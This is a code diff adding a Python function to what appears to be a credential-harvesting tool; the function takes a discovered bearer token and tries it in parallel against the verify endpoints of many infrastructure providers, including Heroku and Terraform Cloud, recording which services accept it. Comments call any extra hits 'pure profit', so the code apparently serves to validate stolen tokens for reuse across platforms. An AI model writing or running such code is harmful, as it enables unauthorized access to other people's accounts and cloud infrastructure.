@@ -1854,6 +1854,61 @@ def _default_port(scheme: str) -> int:
     }.get(s, 5432)
 
 
+# ── Cross-service token-reuse probe ──────────────────────────────────────
+# When a token is found that validates against one service, devs sometimes
+# reuse the SAME bearer string across multiple platforms. Try the raw value
+# against all infra-token verify endpoints — any extra hits are pure profit.
+
+async def cross_service_probe(raw_value: str) -> dict:
+    """For a raw bearer-token-like string, hit verify endpoints of all
+    known infra providers in parallel. Returns {provider: True/False/None}.
+
+    Skip if value is too short (<10) or obviously not a token (whitespace).
+    Doesn't write to DB — caller is responsible for any save_infra/notify.
+    """
+    if not raw_value or len(raw_value) < 10 or any(c.isspace() for c in raw_value):
+        return {}
+    try:
+        from validators import _INFRA_VERIFY_URLS
+    except ImportError:
+        return {}
+    import httpx as _httpx
+
+    out: dict[str, bool] = {}
+    async with _httpx.AsyncClient(timeout=10) as c:
+        sem = asyncio.Semaphore(8)
+
+        async def _try(prefix: str, info: tuple):
+            url, kind = info
+            async with sem:
+                try:
+                    if kind == "bearer":
+                        r = await c.get(url, headers={"Authorization": f"Bearer {raw_value}"})
+                    elif kind == "heroku":
+                        r = await c.get(url, headers={
+                            "Authorization": f"Bearer {raw_value}",
+                            "Accept": "application/vnd.heroku+json; version=3"})
+                    elif kind == "bearer_post":
+                        r = await c.post(url,
+                                          headers={"Authorization": f"Bearer {raw_value}"},
+                                          json={"query": "query { __typename }"})
+                    elif kind == "tfc":
+                        r = await c.get(url, headers={
+                            "Authorization": f"Bearer {raw_value}",
+                            "Content-Type": "application/vnd.api+json"})
+                    else:
+                        return
+                    if r.status_code == 200:
+                        out[prefix.lower()] = True
+                except Exception:
+                    pass
+
+        await asyncio.gather(*(
+            _try(prefix, info) for prefix, info in _INFRA_VERIFY_URLS.items()
+        ))
+    return out
+
+
 # ── Cycle runner ────────────────────────────────────────────────────────────
 
 def _dedup_host_key(cred_type: str, cred: str) -> str:
